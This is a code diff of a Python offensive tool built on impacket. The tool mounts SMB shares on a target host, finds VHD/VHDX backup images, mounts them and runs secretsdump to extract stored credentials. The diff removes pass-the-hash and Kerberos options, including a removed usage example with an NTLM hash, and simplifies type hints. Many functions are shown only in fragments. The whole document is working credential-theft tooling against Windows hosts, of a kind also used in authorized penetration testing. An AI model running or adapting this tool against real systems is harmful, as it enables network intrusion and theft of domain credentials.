@@ -32,7 +32,7 @@ except ImportError as e:
     print("[!] Install: sudo python3 -m pip install impacket")
     sys.exit(1)
 
-def die(msg: str, code: int = 1):
+def die(msg, code=1):
     print(f"[!] {msg}")
     sys.exit(code)
 
@@ -64,17 +64,10 @@ def decode_smb_field(val):
         return ""
     return str(val).strip('\x00').strip()
 
-def list_smb_shares(host: str, user: str, password: str, domain: str, nthash: str = '', use_kerberos: bool = False):
+def list_smb_shares(host, user, password, domain):
     try:
         conn = SMBConnection(host, host, sess_port=445)
-        
-        if use_kerberos:
-            conn.kerberosLogin(user, password, domain, '', '', '')
-        elif nthash:
-            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
-            conn.login(user, '', domain, lmhash=lmhash, nthash=nthash)
-        else:
-            conn.login(user, password, domain)
+        conn.login(user, password, domain)
         
         shares = conn.listShares()
         
@@ -88,7 +81,8 @@ def list_smb_shares(host: str, user: str, password: str, domain: str, nthash: st
                 except:
                     continue
             
-            if not name or name.upper() in ('IPC$', 'ADMIN$'):
+            admin_shares = ('IPC$', 'ADMIN$')
+            if not name or name.upper() in admin_shares:
                 continue
             
             try:
@@ -125,7 +119,7 @@ def select_shares(shares):
         
         print("[!] Invalid selection")
 
-def create_cifs_creds(domain: str, user: str, password: str, nthash: str = ''):
+def create_cifs_creds(domain, user, password):
     fd, path = tempfile.mkstemp(prefix="cifs_", suffix=".creds")
     os.close(fd)
     
@@ -134,26 +128,24 @@ def create_cifs_creds(domain: str, user: str, password: str, nthash: str = ''):
             f.write(f"domain={domain}\n")
         if user:
             f.write(f"username={user}\n")
-        if nthash:
-            f.write(f"password=00000000000000000000000000000000:{nthash}\n")
-        elif password:
+        if password:
             f.write(f"password={password}\n")
     
     os.chmod(path, 0o600)
     return path
 
-def is_mounted(path: str):
+def is_mounted(path):
     try:
         with open('/proc/mounts') as f:
             return any(line.split()[1] == path for line in f)
     except:
         return False
 
-def force_umount(path: str):
+def force_umount(path):
     subprocess.run(['umount', path], capture_output=True)
     subprocess.run(['umount', '-l', path], capture_output=True)
 
-def mount_cifs_share(host: str, share: str, creds_file: str, use_kerberos: bool = False):
+def mount_cifs_share(host, share, creds_file):
     mnt = Path('/mnt') / share
     mnt.mkdir(parents=True, exist_ok=True)
     
@@ -167,11 +159,7 @@ def mount_cifs_share(host: str, share: str, creds_file: str, use_kerberos: bool 
             return None
     
     unc = f"//{host}/{share}"
-    
-    if use_kerberos:
-        opts = f"credentials={creds_file},vers=3.0,sec=krb5,iocharset=utf8"
-    else:
-        opts = f"credentials={creds_file},vers=3.0,iocharset=utf8"
+    opts = f"credentials={creds_file},vers=3.0,iocharset=utf8"
     
     cmd = ['mount', '-t', 'cifs', unc, str(mnt), '-o', opts]
     
@@ -282,7 +270,7 @@ def select_vhdx(vhdx_list):
         
         print("[!] Invalid selection")
 
-def get_fs_type(device: str):
+def get_fs_type(device):
     try:
         result = subprocess.run(
             ['blkid', '-s', 'TYPE', '-o', 'value', device],
@@ -308,7 +296,7 @@ def find_free_nbd():
     
     return None
 
-def mount_vhdx_image(vhdx_path: str):
+def mount_vhdx_image(vhdx_path):
     vhdx_name = Path(vhdx_path).stem
     ext = Path(vhdx_path).suffix.lower()
     fmt = 'vhd' if ext == '.vhd' else 'vhdx'
@@ -453,7 +441,7 @@ def run_secretsdump(args, outfile):
     except Exception as e:
         print(f"[!] Exception: {e}")
 
-def extract_credentials(vhdx_path: str):
+def extract_credentials(vhdx_path):
     hostname = Path(vhdx_path).stem
     
     nbd_dev, mounts = mount_vhdx_image(vhdx_path)
@@ -537,9 +525,6 @@ Examples:
   With password:
     %(prog)s -t 192.168.1.10 -u administrator -p Password123 -d CORP
   
-  Pass-the-hash:
-    %(prog)s -t 192.168.1.10 -u administrator -H e19ccf75ee54e06b06a5907af13cef42 -d CORP
-  
   Specific path:
     %(prog)s -t 192.168.1.10 -u admin -p pass --path "D$/Backups/VMs"
         '''
@@ -548,8 +533,6 @@ Examples:
     parser.add_argument('-u', '--username', default='', help='Username (default: null auth)')
     parser.add_argument('-p', '--password', default='', help='Password')
     parser.add_argument('-d', '--domain', default='', help='Domain name')
-    parser.add_argument('-H', '--hash', default='', help='NTLM hash (format: [LM:]NT)')
-    parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication')
     parser.add_argument('--path', default='', help='Specific path to scan (e.g., "D$/Backups/VMs")')
     
     args = parser.parse_args()
@@ -558,36 +541,23 @@ Examples:
     user = args.username
     password = args.password
     domain = args.domain
-    nthash = args.hash
-    use_kerberos = args.kerberos
     specific_path = args.path
     
-    if nthash and ':' in nthash:
-        nthash = nthash.split(':')[1]
-    
-    if user and not password and not nthash and not use_kerberos:
+    if user and not password:
         password = getpass.getpass("[?] Password: ")
     
     domain_prefix = f"{domain}\\" if domain else ""
-    
-    if use_kerberos:
-        auth_desc = f"Kerberos ({domain_prefix}{user})"
-    elif nthash:
-        auth_desc = f"NTLM hash ({domain_prefix}{user})"
-    elif user:
-        auth_desc = f"{domain_prefix}{user}"
-    else:
-        auth_desc = "null authentication"
+    auth_desc = f"{domain_prefix}{user}" if user else "null authentication"
     
     print(f"[*] Connecting to {host} with {auth_desc}...")
     
-    shares = list_smb_shares(host, user, password, domain, nthash, use_kerberos)
+    shares = list_smb_shares(host, user, password, domain)
     
     if not shares:
         die("No accessible shares found")
     
     if specific_path:
-        parts = specific_path.replace('/', '\\').split('\\', 1)
+        parts = specific_path.replace('\\', '/').split('/', 1)
         share_name_raw = parts[0]
         share_name = share_name_raw.replace('$', '')
         subpath = parts[1] if len(parts) > 1 else ''
@@ -596,6 +566,7 @@ Examples:
         
         available_share_names = [s[0] for s in shares]
         
+        admin_shares = ('IPC$', 'ADMIN$')
         if share_with_dollar not in available_share_names and share_name not in available_share_names:
             die(f"Specified share '{share_name}' not found in available shares")
         
@@ -604,13 +575,13 @@ Examples:
     else:
         selected = select_shares(shares)
     
-    creds = create_cifs_creds(domain, user, password, nthash)
+    creds = create_cifs_creds(domain, user, password)
     
     mounted_shares = []
     
     try:
         for share in selected:
-            mnt = mount_cifs_share(host, share, creds, use_kerberos)
+            mnt = mount_cifs_share(host, share, creds)
             if mnt:
                 mounted_shares.append(mnt)
         
